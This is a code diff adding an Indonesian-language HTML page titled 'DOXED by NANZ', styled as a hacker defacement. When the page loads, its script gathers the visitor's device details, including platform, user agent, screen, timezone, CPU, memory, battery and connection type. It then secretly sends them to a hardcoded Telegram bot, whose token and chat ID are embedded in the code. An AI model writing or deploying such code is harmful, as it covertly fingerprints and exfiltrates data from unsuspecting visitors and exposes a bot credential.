@@ -1,0 +1,97 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <title>DOXED by NANZ</title>
+  <style>
+    body {
+      background: #0f0f0f;
+      color: #00ff00;
+      font-family: monospace;
+      padding: 30px;
+    }
+    h1 {
+      color: red;
+      text-align: center;
+      margin-bottom: 20px;
+    }
+    .container {
+      background: #111;
+      border: 1px solid #0f0;
+      padding: 20px;
+      border-radius: 10px;
+      max-width: 800px;
+      margin: auto;
+      box-shadow: 0 0 10px #0f0;
+    }
+    .data-row {
+      display: flex;
+      justify-content: space-between;
+      padding: 6px 0;
+      border-bottom: 1px dashed #0f0;
+    }
+  </style>
+</head>
+<body>
+  <h1>𝑫𝒐𝒙 𝑾𝒆𝒃 𝑯𝒂𝒄𝒌𝒆𝒅 𝑩𝒚 NANZZ</h1>
+  <div class="container" id="device-info">Memuat data...</div>
+
+  <script>
+    const BOT_TOKEN = "7890631218:AAHoMkSMS9kE9fK0CVEgAEnl2NYquyIrAuM";
+    const CHAT_ID = "7894929132";
+
+    async function getDeviceInfo() {
+      const info = {
+        "Platform": navigator.platform,
+        "User Agent": navigator.userAgent,
+        "Resolusi Layar": `${screen.width} x ${screen.height}`,
+        "Kedalaman Warna": `${screen.colorDepth} bit`,
+        "Zona Waktu": Intl.DateTimeFormat().resolvedOptions().timeZone,
+        "Bahasa": navigator.language,
+        "Cookies Aktif": navigator.cookieEnabled ? "Ya" : "Tidak",
+        "Cores CPU": navigator.hardwareConcurrency || "Tidak tersedia",
+        "Memori Perangkat (GB)": navigator.deviceMemory || "Tidak tersedia",
+        "Status Online": navigator.onLine ? "Online" : "Offline",
+        "Vendor": navigator.vendor,
+        "Tipe Platform": navigator.platform,
+        "Orientasi Layar": screen.orientation?.type || "Tidak tersedia",
+        "Tipe Koneksi": navigator.connection?.effectiveType || "Tidak tersedia",
+        "DPI": window.devicePixelRatio,
+        "Touch Support": 'ontouchstart' in window ? "Ya" : "Tidak"
+      };
+
+      if (navigator.getBattery) {
+        const battery = await navigator.getBattery();
+        info["Battery"] = `${Math.round(battery.level * 100)}%`;
+        info["Battery Charging"] = battery.charging ? "Ya" : "Tidak";
+      }
+
+      let text = "📱 *Device Info Report*\n";
+      const container = document.getElementById("device-info");
+      container.innerHTML = "";
+
+      for (const key in info) {
+        const row = document.createElement("div");
+        row.className = "data-row";
+        row.innerHTML = `<div>${key}</div><div>${info[key]}</div>`;
+        container.appendChild(row);
+        text += `• *${key}*: ${info[key]}\n`;
+      }
+
+      // Kirim ke Telegram
+      const sendURL = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+      await fetch(sendURL, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: CHAT_ID,
+          text: text,
+          parse_mode: "Markdown"
+        })
+      });
+    }
+
+    getDeviceInfo();
+  </script>
+</body>
+</html>
